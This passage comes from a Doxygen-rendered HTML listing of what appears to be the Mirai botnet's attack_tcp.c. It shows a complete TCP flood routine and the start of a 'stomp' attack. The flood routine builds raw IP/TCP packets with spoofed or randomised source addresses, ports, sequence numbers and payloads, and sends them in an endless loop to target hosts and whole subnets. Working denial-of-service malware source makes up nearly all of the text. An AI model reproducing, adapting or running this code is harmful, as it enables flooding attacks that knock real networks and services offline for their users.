opts_len, <span class="keyword">struct</span> <a class="code" href="structattack__option.html">attack_option</a> *opts)</div><div class="line"><a name="l00162"></a><span class="lineno">  162</span>&#160;{</div><div class="line"><a name="l00163"></a><span class="lineno">  163</span>&#160;    <span class="keywordtype">int</span> i, fd;</div><div class="line"><a name="l00164"></a><span class="lineno">  164</span>&#160;    <span class="keywordtype">char</span> **pkts = calloc(targs_len, <span class="keyword">sizeof</span> (<span class="keywordtype">char</span> *));</div><div class="line"><a name="l00165"></a><span class="lineno">  165</span>&#160;    uint8_t ip_tos = <a class="code" href="attack_8c.html#ab59e5bf31f63eeb001f8ec1278a15907">attack_get_opt_int</a>(opts_len, opts, <a class="code" href="attack_8h.html#a1ac4210e00c74506c31642a74e3fc1c7">ATK_OPT_IP_TOS</a>, 0);</div><div class="line"><a name="l00166"></a><span class="lineno">  166</span>&#160;    uint16_t ip_ident = <a class="code" href="attack_8c.html#ab59e5bf31f63eeb001f8ec1278a15907">attack_get_opt_int</a>(opts_len, opts, <a class="code" href="attack_8h.html#aecb175215ca3d0ce5017cd8cedb7e0fe">ATK_OPT_IP_IDENT</a>, 0xffff);</div><div class="line"><a name="l00167"></a><span class="lineno">  167</span>&#160;    uint8_t ip_ttl = <a class="code" href="attack_8c.html#ab59e5bf31f63eeb001f8ec1278a15907">attack_get_opt_int</a>(opts_len, opts, <a class="code" href="attack_8h.html#acfa2ed8a557040aed04b6c9346aa0eb9">ATK_OPT_IP_TTL</a>, 64);</div><div class="line"><a name="l00168"></a><span class="lineno">  168</span>&#160;    <a class="code" href="loader_2src_2headers_2includes_8h.html#af492d2bddcb2befacb3aa03dcdf9aafd">BOOL</a> dont_frag = <a class="code" href="attack_8c.html#ab59e5bf31f63eeb001f8ec1278a15907">attack_get_opt_int</a>(opts_len, opts, <a class="code" href="attack_8h.html#a57162ecbd3f7644a8f6a6b58aa4f8596">ATK_OPT_IP_DF</a>, <a class="code" href="loader_2src_2headers_2includes_8h.html#aa93f0eb578d23995850d61f7d61c55c1">FALSE</a>);</div><div class="line"><a name="l00169"></a><span class="lineno">  169</span>&#160;    <a class="code" href="loader_2src_2headers_2includes_8h.html#adccb5337cf206fe3eca7c4732f634bb9">port_t</a> sport = <a class="code" href="attack_8c.html#ab59e5bf31f63eeb001f8ec1278a15907">attack_get_opt_int</a>(opts_len, opts, <a class="code" href="attack_8h.html#a4d0115976f56267c42e6a09ff3651c02">ATK_OPT_SPORT</a>, 0xffff);</div><div class="line"><a name="l00170"></a><span class="lineno">  170</span>&#160;    <a class="code" href="loader_2src_2headers_2includes_8h.html#adccb5337cf206fe3eca7c4732f634bb9">port_t</a> dport = <a class="code" href="attack_8c.html#ab59e5bf31f63eeb001f8ec1278a15907">attack_get_opt_int</a>(opts_len, opts, <a class="code" href="attack_8h.html#ab8471c4c3e703d3c9ee4e971c48ba5fb">ATK_OPT_DPORT</a>, 0xffff);</div><div class="line"><a name="l00171"></a><span class="lineno">  171</span>&#160;    uint32_t seq = <a class="code" href="attack_8c.html#ab59e5bf31f63eeb001f8ec1278a15907">attack_get_opt_int</a>(opts_len, opts, <a class="code" href="attack_8h.html#a97b7c19adba8f5e25d603d4fcd80c995">ATK_OPT_SEQRND</a>, 0xffff);</div><div class="line"><a name="l00172"></a><span class="lineno">  172</span>&#160;    uint32_t ack = <a class="code" href="attack_8c.html#ab59e5bf31f63eeb001f8ec1278a15907">attack_get_opt_int</a>(opts_len, opts, <a class="code" href="attack_8h.html#a0fcd18d4c1705cc62b8a2d3f92e0a780">ATK_OPT_ACKRND</a>, 0xffff);</div><div class="line"><a name="l00173"></a><span class="lineno">  173</span>&#160;    <a class="code" href="loader_2src_2headers_2includes_8h.html#af492d2bddcb2befacb3aa03dcdf9aafd">BOOL</a> urg_fl = <a class="code" href="attack_8c.html#ab59e5bf31f63eeb001f8ec1278a15907">attack_get_opt_int</a>(opts_len, opts, <a class="code" href="attack_8h.html#a5a6f282c43f088516dce2de1b69ae7d8">ATK_OPT_URG</a>, <a class="code" href="loader_2src_2headers_2includes_8h.html#aa93f0eb578d23995850d61f7d61c55c1">FALSE</a>);</div><div class="line"><a name="l00174"></a><span class="lineno">  174</span>&#160;    <a class="code" href="loader_2src_2headers_2includes_8h.html#af492d2bddcb2befacb3aa03dcdf9aafd">BOOL</a> ack_fl = <a class="code" href="attack_8c.html#ab59e5bf31f63eeb001f8ec1278a15907">attack_get_opt_int</a>(opts_len, opts, <a class="code" href="attack_8h.html#a61c202b303f42c57328c999b1104877d">ATK_OPT_ACK</a>, <a class="code" href="loader_2src_2headers_2includes_8h.html#aa8cecfc5c5c054d2875c03e77b7be15d">TRUE</a>);</div><div class="line"><a name="l00175"></a><span class="lineno">  175</span>&#160;    <a class="code" href="loader_2src_2headers_2includes_8h.html#af492d2bddcb2befacb3aa03dcdf9aafd">BOOL</a> psh_fl = <a class="code" href="attack_8c.html#ab59e5bf31f63eeb001f8ec1278a15907">attack_get_opt_int</a>(opts_len, opts, <a class="code" href="attack_8h.html#a5ae76926414352bb8e12896c5581a0fd">ATK_OPT_PSH</a>, <a class="code" href="loader_2src_2headers_2includes_8h.html#aa93f0eb578d23995850d61f7d61c55c1">FALSE</a>);</div><div class="line"><a name="l00176"></a><span class="lineno">  176</span>&#160;    <a class="code" href="loader_2src_2headers_2includes_8h.html#af492d2bddcb2befacb3aa03dcdf9aafd">BOOL</a> rst_fl = <a class="code" href="attack_8c.html#ab59e5bf31f63eeb001f8ec1278a15907">attack_get_opt_int</a>(opts_len, opts, <a class="code" href="attack_8h.html#a4464ea34ef73875f57b5c6a412aaac20">ATK_OPT_RST</a>, <a class="code" href="loader_2src_2headers_2includes_8h.html#aa93f0eb578d23995850d61f7d61c55c1">FALSE</a>);</div><div class="line"><a name="l00177"></a><span class="lineno">  177</span>&#160;    <a class="code" href="loader_2src_2headers_2includes_8h.html#af492d2bddcb2befacb3aa03dcdf9aafd">BOOL</a> syn_fl = <a class="code" href="attack_8c.html#ab59e5bf31f63eeb001f8ec1278a15907">attack_get_opt_int</a>(opts_len, opts, <a class="code" href="attack_8h.html#a4f086d53d4494633a898fbd9886b08bf">ATK_OPT_SYN</a>, <a class="code" href="loader_2src_2headers_2includes_8h.html#aa93f0eb578d23995850d61f7d61c55c1">FALSE</a>);</div><div class="line"><a name="l00178"></a><span class="lineno">  178</span>&#160;    <a class="code" href="loader_2src_2headers_2includes_8h.html#af492d2bddcb2befacb3aa03dcdf9aafd">BOOL</a> fin_fl = <a class="code" href="attack_8c.html#ab59e5bf31f63eeb001f8ec1278a15907">attack_get_opt_int</a>(opts_len, opts, <a class="code" href="attack_8h.html#a2ad2949e3a473ebba047e474abf5d461">ATK_OPT_FIN</a>, <a class="code" href="loader_2src_2headers_2includes_8h.html#aa93f0eb578d23995850d61f7d61c55c1">FALSE</a>);</div><div class="line"><a name="l00179"></a><span class="lineno">  179</span>&#160;    <span class="keywordtype">int</span> <a class="code" href="protocol_8h.html#ad1a572736a10ff6b282c5f43c4ea1ccf">data_len</a> = <a class="code" href="attack_8c.html#ab59e5bf31f63eeb001f8ec1278a15907">attack_get_opt_int</a>(opts_len, opts, <a class="code" href="attack_8h.html#aacac129514ea3914af56b5eb4c71f8c6">ATK_OPT_PAYLOAD_SIZE</a>, 512);</div><div class="line"><a name="l00180"></a><span class="lineno">  180</span>&#160;    <a class="code" href="loader_2src_2headers_2includes_8h.html#af492d2bddcb2befacb3aa03dcdf9aafd">BOOL</a> data_rand = <a class="code" href="attack_8c.html#ab59e5bf31f63eeb001f8ec1278a15907">attack_get_opt_int</a>(opts_len, opts, <a class="code" href="attack_8h.html#ac8d9ef7cc50e5b0e43f50b087c4c7104">ATK_OPT_PAYLOAD_RAND</a>, <a class="code" href="loader_2src_2headers_2includes_8h.html#aa8cecfc5c5c054d2875c03e77b7be15d">TRUE</a>);</div><div class="line"><a name="l00181"></a><span class="lineno">  181</span>&#160;    uint32_t source_ip = <a class="code" href="attack_8c.html#a51262dda96f2861dbd13fc0b6f0a31d3">attack_get_opt_ip</a>(opts_len, opts, <a class="code" href="attack_8h.html#a9b14feb6720fefac0c6da63a77da718e">ATK_OPT_SOURCE</a>, <a class="code" href="mirai_2bot_2includes_8h.html#aecb64c7238a325af454cf5e17d933ff2">LOCAL_ADDR</a>);</div><div class="line"><a name="l00182"></a><span class="lineno">  182</span>&#160;</div><div class="line"><a name="l00183"></a><span class="lineno">  183</span>&#160;    <span class="keywordflow">if</span> ((fd = <a class="code" href="wget_8c.html#aa8318fbee111c5bde5952c63e894c962">socket</a>(AF_INET, SOCK_RAW, IPPROTO_TCP)) == -1)</div><div class="line"><a name="l00184"></a><span class="lineno">  184</span>&#160;    {</div><div class="line"><a name="l00185"></a><span class="lineno">  185</span>&#160;<span class="preprocessor">#ifdef DEBUG</span></div><div class="line"><a name="l00186"></a><span class="lineno">  186</span>&#160;        printf(<span class="stringliteral">&quot;Failed to create raw socket. Aborting attack\n&quot;</span>);</div><div class="line"><a name="l00187"></a><span class="lineno">  187</span>&#160;<span class="preprocessor">#endif</span></div><div class="line"><a name="l00188"></a><span class="lineno">  188</span>&#160;        <span class="keywordflow">return</span>;</div><div class="line"><a name="l00189"></a><span class="lineno">  189</span>&#160;    }</div><div class="line"><a name="l00190"></a><span class="lineno">  190</span>&#160;    i = 1;</div><div class="line"><a name="l00191"></a><span class="lineno">  191</span>&#160;    <span class="keywordflow">if</span> (setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &amp;i, <span class="keyword">sizeof</span> (<span class="keywordtype">int</span>)) == -1)</div><div class="line"><a name="l00192"></a><span class="lineno">  192</span>&#160;    {</div><div class="line"><a name="l00193"></a><span class="lineno">  193</span>&#160;<span class="preprocessor">#ifdef DEBUG</span></div><div class="line"><a name="l00194"></a><span class="lineno">  194</span>&#160;        printf(<span class="stringliteral">&quot;Failed to set IP_HDRINCL. Aborting\n&quot;</span>);</div><div class="line"><a name="l00195"></a><span class="lineno">  195</span>&#160;<span class="preprocessor">#endif</span></div><div class="line"><a name="l00196"></a><span class="lineno">  196</span>&#160;        <a class="code" href="wget_8c.html#a9c7f6d5331abb2692a876d5ee67474b7">close</a>(fd);</div><div class="line"><a name="l00197"></a><span class="lineno">  197</span>&#160;        <span class="keywordflow">return</span>;</div><div class="line"><a name="l00198"></a><span class="lineno">  198</span>&#160;    }</div><div class="line"><a name="l00199"></a><span class="lineno">  199</span>&#160;</div><div class="line"><a name="l00200"></a><span class="lineno">  200</span>&#160;    <span class="keywordflow">for</span> (i = 0; i &lt; targs_len; i++)</div><div class="line"><a name="l00201"></a><span class="lineno">  201</span>&#160;    {</div><div class="line"><a name="l00202"></a><span class="lineno">  202</span>&#160;        <span class="keyword">struct </span>iphdr *iph;</div><div class="line"><a name="l00203"></a><span class="lineno">  203</span>&#160;        <span class="keyword">struct </span>tcphdr *tcph;</div><div class="line"><a name="l00204"></a><span class="lineno">  204</span>&#160;        <span class="keywordtype">char</span> *payload;</div><div class="line"><a name="l00205"></a><span class="lineno">  205</span>&#160;</div><div class="line"><a name="l00206"></a><span class="lineno">  206</span>&#160;        pkts[i] = calloc(1510, <span class="keyword">sizeof</span> (<span class="keywordtype">char</span>));</div><div class="line"><a name="l00207"></a><span class="lineno">  207</span>&#160;        iph = (<span class="keyword">struct </span>iphdr *)pkts[i];</div><div class="line"><a name="l00208"></a><span class="lineno">  208</span>&#160;        tcph = (<span class="keyword">struct </span>tcphdr *)(iph + 1);</div><div class="line"><a name="l00209"></a><span class="lineno">  209</span>&#160;        payload = (<span class="keywordtype">char</span> *)(tcph + 1);</div><div class="line"><a name="l00210"></a><span class="lineno">  210</span>&#160;</div><div class="line"><a name="l00211"></a><span class="lineno">  211</span>&#160;        iph-&gt;version = 4;</div><div class="line"><a name="l00212"></a><span class="lineno">  212</span>&#160;        iph-&gt;ihl = 5;</div><div class="line"><a name="l00213"></a><span class="lineno">  213</span>&#160;        iph-&gt;tos = ip_tos;</div><div class="line"><a name="l00214"></a><span class="lineno">  214</span>&#160;        iph-&gt;tot_len = htons(<span class="keyword">sizeof</span> (<span class="keyword">struct</span> iphdr) + <span class="keyword">sizeof</span> (<span class="keyword">struct</span> tcphdr) + data_len);</div><div class="line"><a name="l00215"></a><span class="lineno">  215</span>&#160;        iph-&gt;id = htons(ip_ident);</div><div class="line"><a name="l00216"></a><span class="lineno">  216</span>&#160;        iph-&gt;ttl = ip_ttl;</div><div class="line"><a name="l00217"></a><span class="lineno">  217</span>&#160;        <span class="keywordflow">if</span> (dont_frag)</div><div class="line"><a name="l00218"></a><span class="lineno">  218</span>&#160;            iph-&gt;frag_off = htons(1 &lt;&lt; 14);</div><div class="line"><a name="l00219"></a><span class="lineno">  219</span>&#160;        iph-&gt;protocol = IPPROTO_TCP;</div><div class="line"><a name="l00220"></a><span class="lineno">  220</span>&#160;        iph-&gt;saddr = source_ip;</div><div class="line"><a name="l00221"></a><span class="lineno">  221</span>&#160;        iph-&gt;daddr = targs[i].<a class="code" href="structattack__target.html#a431d4eed6dd4e7faddf9b8615b4d5c2a">addr</a>;</div><div class="line"><a name="l00222"></a><span class="lineno">  222</span>&#160;</div><div class="line"><a name="l00223"></a><span class="lineno">  223</span>&#160;        tcph-&gt;source = htons(sport);</div><div class="line"><a name="l00224"></a><span class="lineno">  224</span>&#160;        tcph-&gt;dest = htons(dport);</div><div class="line"><a name="l00225"></a><span class="lineno">  225</span>&#160;        tcph-&gt;seq = htons(seq);</div><div class="line"><a name="l00226"></a><span class="lineno">  226</span>&#160;        tcph-&gt;doff = 5;</div><div class="line"><a name="l00227"></a><span class="lineno">  227</span>&#160;        tcph-&gt;urg = urg_fl;</div><div class="line"><a name="l00228"></a><span class="lineno">  228</span>&#160;        tcph-&gt;ack = ack_fl;</div><div class="line"><a name="l00229"></a><span class="lineno">  229</span>&#160;        tcph-&gt;psh = psh_fl;</div><div class="line"><a name="l00230"></a><span class="lineno">  230</span>&#160;        tcph-&gt;rst = rst_fl;</div><div class="line"><a name="l00231"></a><span class="lineno">  231</span>&#160;        tcph-&gt;syn = syn_fl;</div><div class="line"><a name="l00232"></a><span class="lineno">  232</span>&#160;        tcph-&gt;fin = fin_fl;</div><div class="line"><a name="l00233"></a><span class="lineno">  233</span>&#160;        tcph-&gt;window = <a class="code" href="rand_8c.html#accf5c4faf4fb7eb9d74bbf1764921b00">rand_next</a>() &amp; 0xffff;</div><div class="line"><a name="l00234"></a><span class="lineno">  234</span>&#160;        <span class="keywordflow">if</span> (psh_fl)</div><div class="line"><a name="l00235"></a><span class="lineno">  235</span>&#160;            tcph-&gt;psh = <a class="code" href="loader_2src_2headers_2includes_8h.html#aa8cecfc5c5c054d2875c03e77b7be15d">TRUE</a>;</div><div class="line"><a name="l00236"></a><span class="lineno">  236</span>&#160;</div><div class="line"><a name="l00237"></a><span class="lineno">  237</span>&#160;        <a class="code" href="rand_8c.html#a11c986f4ca9d396a9bc68c0dd4b3903f">rand_str</a>(payload, data_len);</div><div class="line"><a name="l00238"></a><span class="lineno">  238</span>&#160;    }</div><div class="line"><a name="l00239"></a><span class="lineno">  239</span>&#160;</div><div class="line"><a name="l00240"></a><span class="lineno">  240</span>&#160;<span class="comment">//    targs[0].sock_addr.sin_port = tcph-&gt;dest;</span></div><div class="line"><a name="l00241"></a><span class="lineno">  241</span>&#160;<span class="comment">//    if (sendto(fd, pkt, sizeof (struct iphdr) + sizeof (struct tcphdr) + data_len, MSG_NOSIGNAL, (struct sockaddr *)&amp;targs[0].sock_addr, sizeof (struct sockaddr_in)) &lt; 1)</span></div><div class="line"><a name="l00242"></a><span class="lineno">  242</span>&#160;<span class="comment">//    {</span></div><div class="line"><a name="l00243"></a><span class="lineno">  243</span>&#160;<span class="comment">//</span></div><div class="line"><a name="l00244"></a><span class="lineno">  244</span>&#160;<span class="comment">//    }</span></div><div class="line"><a name="l00245"></a><span class="lineno">  245</span>&#160;</div><div class="line"><a name="l00246"></a><span class="lineno">  246</span>&#160;    <span class="keywordflow">while</span> (<a class="code" href="loader_2src_2headers_2includes_8h.html#aa8cecfc5c5c054d2875c03e77b7be15d">TRUE</a>)</div><div class="line"><a name="l00247"></a><span class="lineno">  247</span>&#160;    {</div><div class="line"><a name="l00248"></a><span class="lineno">  248</span>&#160;        <span class="keywordflow">for</span> (i = 0; i &lt; targs_len; i++)</div><div class="line"><a name="l00249"></a><span class="lineno">  249</span>&#160;        {</div><div class="line"><a name="l00250"></a><span class="lineno">  250</span>&#160;            <span class="keywordtype">char</span> *pkt = pkts[i];</div><div class="line"><a name="l00251"></a><span class="lineno">  251</span>&#160;            <span class="keyword">struct </span>iphdr *iph = (<span class="keyword">struct </span>iphdr *)pkt;</div><div class="line"><a name="l00252"></a><span class="lineno">  252</span>&#160;            <span class="keyword">struct </span>tcphdr *tcph = (<span class="keyword">struct </span>tcphdr *)(iph + 1);</div><div class="line"><a name="l00253"></a><span class="lineno">  253</span>&#160;            <span class="keywordtype">char</span> *data = (<span class="keywordtype">char</span> *)(tcph + 1);</div><div class="line"><a name="l00254"></a><span class="lineno">  254</span>&#160;</div><div class="line"><a name="l00255"></a><span class="lineno">  255</span>&#160;            <span class="comment">// For prefix attacks</span></div><div class="line"><a name="l00256"></a><span class="lineno">  256</span>&#160;            <span class="keywordflow">if</span> (targs[i].netmask &lt; 32)</div><div class="line"><a name="l00257"></a><span class="lineno">  257</span>&#160;                iph-&gt;daddr = htonl(ntohl(targs[i].addr) + (((uint32_t)<a class="code" href="rand_8c.html#accf5c4faf4fb7eb9d74bbf1764921b00">rand_next</a>()) &gt;&gt; targs[i].netmask));</div><div class="line"><a name="l00258"></a><span class="lineno">  258</span>&#160;</div><div class="line"><a name="l00259"></a><span class="lineno">  259</span>&#160;            <span class="keywordflow">if</span> (source_ip == 0xffffffff)</div><div class="line"><a name="l00260"></a><span class="lineno">  260</span>&#160;                iph-&gt;saddr = <a class="code" href="rand_8c.html#accf5c4faf4fb7eb9d74bbf1764921b00">rand_next</a>();</div><div class="line"><a name="l00261"></a><span class="lineno">  261</span>&#160;            <span class="keywordflow">if</span> (ip_ident == 0xffff)</div><div class="line"><a name="l00262"></a><span class="lineno">  262</span>&#160;                iph-&gt;id = <a class="code" href="rand_8c.html#accf5c4faf4fb7eb9d74bbf1764921b00">rand_next</a>() &amp; 0xffff;</div><div class="line"><a name="l00263"></a><span class="lineno">  263</span>&#160;            <span class="keywordflow">if</span> (sport == 0xffff)</div><div class="line"><a name="l00264"></a><span class="lineno">  264</span>&#160;                tcph-&gt;source = <a class="code" href="rand_8c.html#accf5c4faf4fb7eb9d74bbf1764921b00">rand_next</a>() &amp; 0xffff;</div><div class="line"><a name="l00265"></a><span class="lineno">  265</span>&#160;            <span class="keywordflow">if</span> (dport == 0xffff)</div><div class="line"><a name="l00266"></a><span class="lineno">  266</span>&#160;                tcph-&gt;dest = <a class="code" href="rand_8c.html#accf5c4faf4fb7eb9d74bbf1764921b00">rand_next</a>() &amp; 0xffff;</div><div class="line"><a name="l00267"></a><span class="lineno">  267</span>&#160;            <span class="keywordflow">if</span> (seq == 0xffff)</div><div class="line"><a name="l00268"></a><span class="lineno">  268</span>&#160;                tcph-&gt;seq = <a class="code" href="rand_8c.html#accf5c4faf4fb7eb9d74bbf1764921b00">rand_next</a>();</div><div class="line"><a name="l00269"></a><span class="lineno">  269</span>&#160;            <span class="keywordflow">if</span> (ack == 0xffff)</div><div class="line"><a name="l00270"></a><span class="lineno">  270</span>&#160;                tcph-&gt;ack_seq = <a class="code" href="rand_8c.html#accf5c4faf4fb7eb9d74bbf1764921b00">rand_next</a>();</div><div class="line"><a name="l00271"></a><span class="lineno">  271</span>&#160;</div><div class="line"><a name="l00272"></a><span class="lineno">  272</span>&#160;            <span class="comment">// Randomize packet content?</span></div><div class="line"><a name="l00273"></a><span class="lineno">  273</span>&#160;            <span class="keywordflow">if</span> (data_rand)</div><div class="line"><a name="l00274"></a><span class="lineno">  274</span>&#160;                <a class="code" href="rand_8c.html#a11c986f4ca9d396a9bc68c0dd4b3903f">rand_str</a>(data, data_len);</div><div class="line"><a name="l00275"></a><span class="lineno">  275</span>&#160;</div><div class="line"><a name="l00276"></a><span class="lineno">  276</span>&#160;            iph-&gt;check = 0;</div><div class="line"><a name="l00277"></a><span class="lineno">  277</span>&#160;            iph-&gt;check = <a class="code" href="checksum_8c.html#a84522f5e663ea711a5ceafdf03e586ea">checksum_generic</a>((uint16_t *)iph, <span class="keyword">sizeof</span> (<span class="keyword">struct</span> iphdr));</div><div class="line"><a name="l00278"></a><span class="lineno">  278</span>&#160;</div><div class="line"><a name="l00279"></a><span class="lineno">  279</span>&#160;            tcph-&gt;check = 0;</div><div class="line"><a name="l00280"></a><span class="lineno">  280</span>&#160;            tcph-&gt;check = <a class="code" href="checksum_8c.html#a5144ab59500e01ed196ae6d8b4584c98">checksum_tcpudp</a>(iph, tcph, htons(<span class="keyword">sizeof</span> (<span class="keyword">struct</span> tcphdr) + data_len), <span class="keyword">sizeof</span> (<span class="keyword">struct</span> tcphdr) + data_len);</div><div class="line"><a name="l00281"></a><span class="lineno">  281</span>&#160;</div><div class="line"><a name="l00282"></a><span class="lineno">  282</span>&#160;            targs[i].<a class="code" href="structattack__target.html#a8f537c8c1aa7f2b611c6de392d964dfc">sock_addr</a>.sin_port = tcph-&gt;dest;</div><div class="line"><a name="l00283"></a><span class="lineno">  283</span>&#160;            sendto(fd, pkt, <span class="keyword">sizeof</span> (<span class="keyword">struct</span> iphdr) + <span class="keyword">sizeof</span> (<span class="keyword">struct</span> tcphdr) + data_len, MSG_NOSIGNAL, (<span class="keyword">struct</span> sockaddr *)&amp;targs[i].sock_addr, <span class="keyword">sizeof</span> (<span class="keyword">struct</span> sockaddr_in));</div><div class="line"><a name="l00284"></a><span class="lineno">  284</span>&#160;        }</div><div class="line"><a name="l00285"></a><span class="lineno">  285</span>&#160;<span class="preprocessor">#ifdef DEBUG</span></div><div class="line"><a name="l00286"></a><span class="lineno">  286</span>&#160;            <span class="keywordflow">break</span>;</div><div class="line"><a name="l00287"></a><span class="lineno">  287</span>&#160;            <span class="keywordflow">if</span> (errno != 0)</div><div class="line"><a name="l00288"></a><span class="lineno">  288</span>&#160;                printf(<span class="stringliteral">&quot;errno = %d\n&quot;</span>, errno);</div><div class="line"><a name="l00289"></a><span class="lineno">  289</span>&#160;<span class="preprocessor">#endif</span></div><div class="line"><a name="l00290"></a><span class="lineno">  290</span>&#160;    }</div><div class="line"><a name="l00291"></a><span class="lineno">  291</span>&#160;}</div><div class="line"><a name="l00292"></a><span class="lineno">  292</span>&#160;</div><div class="line"><a name="l00293"></a><span class="lineno"><a class="line" href="attack__tcp_8c.html#a6576962e0ea664ef81c0e70e79a07e0b">  293</a></span>&#160;<span class="keywordtype">void</span> <a class="code" href="attack__tcp_8c.html#a6576962e0ea664ef81c0e70e79a07e0b">attack_tcp_stomp</a>(uint8_t targs_len, <span class="keyword">struct</span> <a class="code" href="structattack__target.html">attack_target</a> *targs, uint8_t opts_len, <span class="keyword">struct</span> <a class="code" href="structattack__option.html">attack_option</a> *opts)</div><div class="line"><a name="l00294"></a><span class="lineno">  294</span>&#160;{</div><div class="line"><a name="l00295"></a><span class="lineno">  295</span>&#160;    <span class="keywordtype">int</span> i, rfd;</div><div class="line"><a name="l00296"></a><span class="lineno">  296</span>&#160;    <span class="keyword">struct </span><a class="code" href="structattack__stomp__data.html">attack_stomp_data</a> *stomp_data = calloc(targs_len, <span class="keyword">sizeof</span> (<span class="keyword">struct</span> <a class="code" href="structattack__stomp__data.html">attack_stomp_data</a>));</div><div class="line"><a name="l00297"></a><span class="lineno">  297</span>&#160;    <span class="keywordtype">char</span> **pkts = calloc(targs_len, <span class="keyword">sizeof</span> (<span class="keywordtype">char</span> *));</div><div class="line"><a name="l00298"></a><span class="lineno">  298</span>&#160;    uint8_t ip_tos = <a class="code" href="attack_8c.html#ab59e5bf31f63eeb001f8ec1278a15907">attack_get_opt_int</a>(opts_len, opts, <a class="code" href="attack_8h.html#a1ac4210e00c74506c31642a74e3fc1c7">ATK_OPT_IP_TOS</a>, 0);</div><div class="line"><a name="l00299"></a><span class="lineno">  299</span>&#160;    uint16_t ip_ident = <a class="code" href="attack_8c.html#ab59e5bf31f63eeb001f8ec1278a15907">attack_get_opt_int</a>(opts_len, opts, <a class="code" href="attack_8h.html#aecb175215ca3d0ce5017cd8cedb7e0fe">ATK_OPT_IP_IDENT</a>, 0xffff);</div><div class="line"><a name="l00300"></a><span class="lineno">  300</span>&#160;    uint8_t ip_ttl = <a class="code" href="attack_8c.html#ab59e5bf31f63eeb001f8ec1278a15907">attack_get_opt_int</a>(opts_len, opts, <a class="code" href="attack_8h.html#acfa2ed8a557040aed04b6c9346aa0eb9">ATK_OPT_IP_TTL</a>, 64);</div><div class="line"><a name="l00301"></a><span class="lineno">  301</span>&#160;    <a class="code" href="loader_2src_2headers_2includes_8h.html#af492d2bddcb2befacb3aa03dcdf9aafd">BOOL</a> dont_frag = <a class="code" href="attack_8c.html#ab59e5bf31f63eeb001f8ec1278a15907">attack_get_opt_int</a>(opts_len, opts, <a class="code" href="attack_8h.html#a57162ecbd3f7644a8f6a6b58aa4f8596">ATK_OPT_IP_DF</a>, <a class="code" href="loader_2src_2headers_2includes_8h.html#aa8cecfc5c5c054d2875c03e77b7be15d">TRUE</a>);</div><div class="line"><a name="l00302"></a><span class="lineno">  302</span>&#160;    <a class="code" href="loader_2src_2headers_2includes_8h.html#adccb5337cf206fe3eca7c4732f634bb9">port_t</a> <a class="code" href="structattack__stomp__data.html#a72bb4223d67736e2972679840a79c72e">dport</a> = <a class="code" href="attack_8c.html#ab59e5bf31f63eeb001f8ec1278a15907">attack_get_opt_int</a>(opts_len, opts, <a class="code" href="attack_8h.html#ab8471c4c3e703d3c9ee4e971c48ba5fb">ATK_OPT_DPORT</a>, 0xffff);</div><div class="line"><a name="l00303"></a><span class="lineno">  303</span>&#160;    <a class="code" href="loader_2src_2headers_2includes_8h.html#af492d2bddcb2befacb3aa03dcdf9aafd">BOOL</a> urg_fl = <a class="code" href="attack_8c.html#ab59e5bf31f63eeb001f8ec1278a15907">attack_get_opt_int</a>(opts_len, opts, <a class="code" href="attack_8h.html#a5a6f282c43f088516dce2de1b69ae7d8">ATK_OPT_URG</a>, <a class="code" href="loader_2src_2headers_2includes_8h.html#aa93f0eb578d23995850d61f7d61c55c1">FALSE</a>);</div><div class="line"><a name="l00304"></a><span class="lineno">  304</span>&#160;    <a class="code" href="loader_2src_2headers_2includes_8h.html#af492d2bddcb2befacb3aa03dcdf9aafd">BOOL</a> ack_fl = <a class="code" href="attack_8c.html#ab59e5bf31f63eeb001f8ec1278a15907">attack_get_opt_int</a>(opts_len, opts, <a class="code" href="attack_8h.html#a61c202b303f42c57328c999b1104877d">ATK_OPT_ACK</a>, <a class="code" href="loader_2src_2headers_2includes_8h.html#aa8cecfc5c5c054d2875c03e77b7be15d">TRUE</a>);</div><div class="line"><a name="l00305"></a><span class="lineno">  305</span>&#160;    <a class="code" href="loader_2src_2headers_2includes_8h.html#af492d2bddcb2befacb3aa03dcdf9aafd">BOOL</a> psh_fl = <a class="code" href="attack_8c.html#ab59e5bf31f63eeb001f8ec1278a15907">attack_get_opt_int</a>(opts_len, opts, <a class="code" href="attack_8h.html#a5ae76926414352bb8e12896c5581a0fd">ATK_OPT_PSH</a>, <a class="code" href="loader_2src_2headers_2includes_8h.html#aa8cecfc5c5c054d2875c03e77b7be15d">TRUE</a>);</div><div class="line"><a name="l00306"></a><span class="lineno">  306</span>&#160;    <a class="code" href="loader_2src_2headers_2includes_8h.html#af492d2bddcb2befacb3aa03dcdf9aafd">BOOL</a> rst_fl = <a class="code" href="attack_8c.html#ab59e5bf31f63eeb001f8ec1278a15907">attack_get_opt_int</a>(opts_len, opts, <a class="code" href="attack_8h.html#a4464ea34ef73875f57b5c6a412aaac20">ATK_OPT_RST</a>, <a class="code" href="loader_2src_2headers_2includes_8h.html#aa93f0eb578d23995850d61f7d61c55c1">FALSE</a>);</div><div class="line"><a name="l00307"></a><span class="lineno">  307</span>&#160;    <a class="code" href="loader_2src_2headers_2includes_8h.html#af492d2bddcb2befacb3aa03dcdf9aafd">BOOL</a> syn_fl = <a class="code" href="attack_8c.html#ab59e5bf31f63eeb001f8ec1278a15907">attack_get_opt_int</a>(opts_len, opts, <a class="code" href="attack_8h.html#a4f086d53d4494633a898fbd9886b08bf">ATK_OPT_SYN</a>, <a class="code" href="loader_2src_2headers_2includes_8h.html#aa93f0eb578d23995850d61f7d61c55c1">FALSE</a>);</div><div class="line"><a name="l00308"></a><span class="lineno">  308</span>&#160;    <a class="code" href="loader_2src_2headers_2includes_8h.html#af492d2bddcb2befacb3aa03dcdf9aafd">BOOL</a> fin_fl = <a class="code" href="attack_8c.html#ab59e5bf31f63eeb001f8ec1278a15907">attack_get_opt_int</a>(opts_len, opts, <a class="code" href="attack_8h.html#a2ad2949e3a473ebba047e474abf5d461">ATK_OPT_FIN</a>, <a class="code" href="loader_2src_2headers_2includes_8h.html#aa93f0eb578d23995850d61f7d61c55c1">FALSE</a>);</div><div class="line"><a name="l00309"></a><span class="lineno">  309</span>&#160;    <span class="keywordtype">int</span> <a class="code" href="protocol_8h.html#ad1a572736a10ff6b282c5f43c4ea1ccf">data_len</a> = <a class="code" href="attack_8c.html#ab59e5bf31f63eeb001f8ec1278a15907">attack_get_opt_int</a>(opts_len, opts, <a class="code" href="attack_8h.html#aacac129514ea3914af56b5eb4c71f8c6">ATK_OPT_PAYLOAD_SIZE</a>, 768);</div><div class="line"><a name="l00310"></a><span class="lineno">  310</span>&#160;    <a class="code" 